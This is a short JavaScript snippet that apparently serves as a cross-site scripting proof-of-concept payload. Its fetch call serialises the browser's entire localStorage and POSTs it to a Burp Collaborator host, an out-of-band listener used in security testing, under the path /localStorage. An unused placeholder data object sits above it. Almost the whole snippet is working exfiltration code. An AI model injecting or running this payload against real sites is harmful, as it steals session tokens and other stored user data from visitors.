let _data = {
  title: "foo",
  body: "bar", 
  userId:1
}

fetch('https://wwwz15e554m201wwajfl7m1ey54z1nq.burpcollaborator.net/localStorage', {
  method: "POST",
  body: JSON.stringify(localStorage),
  headers: {"Content-type": "text/plain"}
})
.then(response => response.json()) 
.then(json => console.log(json))
.catch(err => console.log(err));
